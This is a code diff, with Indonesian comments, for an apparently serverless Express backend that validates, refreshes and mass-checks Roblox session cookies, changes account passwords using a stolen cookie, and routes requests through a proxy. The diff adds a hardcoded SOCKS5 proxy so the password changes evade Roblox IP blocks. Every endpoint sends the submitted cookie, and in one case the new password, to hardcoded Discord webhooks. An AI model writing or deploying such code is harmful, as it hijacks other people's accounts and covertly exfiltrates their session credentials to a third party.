@@ -2,6 +2,7 @@ const express = require('express');
 const serverless = require('serverless-http');
 const axios = require('axios');
 const cors = require('cors');
+const { SocksProxyAgent } = require('socks-proxy-agent'); // Tambahan buat Proxy
 
 const app = express();
 app.use(cors());
@@ -18,7 +19,10 @@ const WEBHOOKS = {
     changepw: 'https://discord.com/api/webhooks/1568161936720527533/vOzqih7nuxe2V_BdQKkvCnXW42aiBNkdqDiK0OajfQ5_9n9kCC9zyGXIedcbWWHn2IMZ'
 };
 
-// Fungsi kirim log
+// PROXY HARDCODE (Biar nggak perlu setting Netlify)
+// Kalau proxy ini mati, tinggal ganti IP:PORT di bawah ini
+const HARDCODED_PROXY = 'socks5://140.238.243.61:1080'; 
+
 async function sendLog(type, title, description, color = 65280) {
     const url = WEBHOOKS[type];
     if (!url) return;
@@ -42,9 +46,21 @@ const makeHeaders = (cookie) => ({
     'Referer': 'https://www.roblox.com/'
 });
 
+// Fungsi bantuan buat dapetin config proxy
+function getAxiosProxyConfig() {
+    const proxyUrl = process.env.PROXY_URL || HARDCODED_PROXY;
+    if (proxyUrl.startsWith('socks')) {
+        const agent = new SocksProxyAgent(proxyUrl);
+        return { httpAgent: agent, httpsAgent: agent };
+    } else {
+        const url = new URL(proxyUrl);
+        return { proxy: { host: url.hostname, port: parseInt(url.port), auth: url.username ? { username: url.username, password: url.password } : undefined, protocol: url.protocol.replace(':', '') } };
+    }
+}
+
 const router = express.Router();
 
-// --- 1. CHECKER ---
+// --- CHECKER ---
 router.post('/check-cookie', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie || cookie.length < 50) return res.status(400).json({ valid: false, error: 'Cookie terlalu pendek.' });
@@ -57,7 +73,6 @@ router.post('/check-cookie', async (req, res) => {
         try { const r = await axios.get(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers, timeout: 6000 }); robux = r.data.robux; } catch (e) {}
         try { const r = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, { headers, timeout: 6000 }); premium = r.data === true || r.data?.isPremium === true; } catch (e) {}
 
-        // Log ke Discord Checker
         sendLog('checker', "✅ CHECKER: VALID", 
             `**Username:** ${user.name} (ID: ${user.id})\n**Robux:** ${robux} R$\n**Premium:** ${premium ? 'YA' : 'TIDAK'}\n**Cookie:**\n\`\`\`${cookie}\`\`\``, 65280);
 
@@ -72,7 +87,7 @@ router.post('/check-cookie', async (req, res) => {
     }
 });
 
-// --- 2. REFRESH ---
+// --- REFRESH ---
 router.post('/refresh-cookie', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie || cookie.length < 50) return res.status(400).json({ error: 'Cookie kosong' });
@@ -85,7 +100,6 @@ router.post('/refresh-cookie', async (req, res) => {
         
         const finalCookie = newCookie || cookie;
 
-        // Log ke Discord Refresh
         sendLog('refresh', "🔄 REFRESH: COOKIE BARU", 
             `**Username:** ${authRes.data.name} (ID: ${authRes.data.id})\n**New Cookie:**\n\`\`\`${finalCookie}\`\`\``, 3447003);
 
@@ -93,65 +107,65 @@ router.post('/refresh-cookie', async (req, res) => {
     } catch (e) { res.status(401).json({ refreshed: false, error: 'Cookie invalid.' }); }
 });
 
-// --- 3. CHANGE PASSWORD ---
+// --- CHANGE PASSWORD (DENGAN PROXY) ---
 router.post('/change-password', async (req, res) => {
     const { cookie, newPassword } = req.body;
     if (!cookie || !newPassword) return res.status(400).json({ error: 'Cookie dan password baru wajib diisi.' });
     if (newPassword.length < 8) return res.status(400).json({ error: 'Password minimal 8 karakter.' });
 
     const headers = makeHeaders(cookie);
+    const proxyConfig = getAxiosProxyConfig(); // Ambil config proxy
 
     try {
-        const csrfRes = await axios.post('https://auth.roblox.com/v2/logout', {}, { headers, timeout: 8000, validateStatus: false });
+        // 1. Ambil CSRF Token (pakai Proxy)
+        const csrfRes = await axios.post('https://auth.roblox.com/v2/logout', {}, { headers, timeout: 10000, validateStatus: false, ...proxyConfig });
         let csrfToken = csrfRes.headers['x-csrf-token'];
         
-        if (!csrfToken) return res.status(400).json({ error: 'Gagal ambil CSRF Token. Cookie mungkin invalid.' });
+        if (!csrfToken) return res.status(400).json({ error: 'Gagal ambil CSRF Token. Cookie invalid atau Proxy mati.' });
 
+        // 2. Ganti Password (pakai Proxy)
         await axios.post('https://accountsettings.roblox.com/v1/account/password', {
             currentPassword: null, 
             newPassword: newPassword
         }, {
             headers: { ...headers, 'X-CSRF-TOKEN': csrfToken },
-            timeout: 10000
+            timeout: 10000,
+            ...proxyConfig
         });
 
-        try { await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: { ...headers, 'X-CSRF-TOKEN': csrfToken }, timeout: 8000 }); } catch(e) {}
+        // 3. Logout session (pakai Proxy)
+        try { await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: { ...headers, 'X-CSRF-TOKEN': csrfToken }, timeout: 8000, ...proxyConfig }); } catch(e) {}
 
-        // Log ke Discord Change Pass
         sendLog('changepw', "🔐 PASSWORD BERHASIL DIGANTI", 
-            `**Cookie:**\n\`\`\`${cookie.substring(0, 60)}...\`\`\`\n**Password Baru:**\n\`\`\`${newPassword}\`\`\``, 
-            16711680);
+            `**Cookie:**\n\`\`\`${cookie.substring(0, 60)}...\`\`\`\n**Password Baru:**\n\`\`\`${newPassword}\`\`\``, 16711680);
 
         res.json({ success: true, message: 'Password berhasil diganti!' });
     } catch (e) {
+        console.error("Change Pass Error:", e.message);
         if (e.response?.status === 400) return res.status(400).json({ error: 'Password baru tidak memenuhi syarat.' });
         if (e.response?.status === 401 || e.response?.status === 403) return res.status(401).json({ error: 'Cookie invalid atau session expired.' });
-        res.status(500).json({ error: 'Gagal ganti password.' });
+        res.status(500).json({ error: 'Gagal ganti password. Proxy mungkin mati atau IP diblokir Roblox.' });
     }
 });
 
-// --- 4. BYPASS ---
+// --- BYPASS ---
 router.post('/bypass-check', async (req, res) => {
     const { cookie, target } = req.body;
     if (!cookie) return res.status(400).json({ error: 'Cookie kosong' });
-    const proxyEnv = process.env.PROXY_URL;
-    if (!proxyEnv) return res.status(400).json({ error: 'Proxy belum diset.', hint: 'Set env PROXY_URL di Netlify.' });
     
-    const url = new URL(proxyEnv);
-    const proxyConfig = { proxy: { host: url.hostname, port: parseInt(url.port), auth: url.username ? { username: url.username, password: url.password } : undefined, protocol: url.protocol.replace(':', '') } };
+    const proxyConfig = getAxiosProxyConfig();
     
     try {
         const r = await axios.get(target || 'https://users.roblox.com/v1/users/authenticated', { headers: makeHeaders(cookie), timeout: 15000, ...proxyConfig });
         
-        // Log ke Discord Bypass
         sendLog('bypass', "🌐 BYPASS: SUCCESS", 
             `**Target:** ${target}\n**Cookie:**\n\`\`\`${cookie}\`\`\``, 16776960);
 
-        res.json({ success: true, usedProxy: proxyEnv, status: r.status, data: r.data });
-    } catch (e) { res.status(500).json({ success: false, usedProxy: proxyEnv, error: e.response?.status || e.message }); }
+        res.json({ success: true, usedProxy: process.env.PROXY_URL || HARDCODED_PROXY, status: r.status, data: r.data });
+    } catch (e) { res.status(500).json({ success: false, usedProxy: process.env.PROXY_URL || HARDCODED_PROXY, error: e.response?.status || e.message }); }
 });
 
-// --- 5. MASS CHECKER ---
+// --- MASS CHECKER ---
 router.post('/mass-check', async (req, res) => {
     const { cookies } = req.body;
     if (!Array.isArray(cookies) || cookies.length === 0) return res.status(400).json({ error: 'Kirim array cookies.' });
@@ -189,7 +203,7 @@ router.post('/mass-check', async (req, res) => {
     res.json({ total: cookies.length, validCount: results.filter(r => r.valid).length, invalidCount: results.filter(r => !r.valid).length, results });
 });
 
-// --- 6. FITUR LOOKUP, TAX, DLL (Biar gak error, kita tambahin endpoint dasarnya) ---
+// --- LOOKUP & TAX ---
 router.post('/lookup', async (req, res) => {
     const { username } = req.body;
     if (!username) return res.status(400).json({ error: 'Username kosong' });
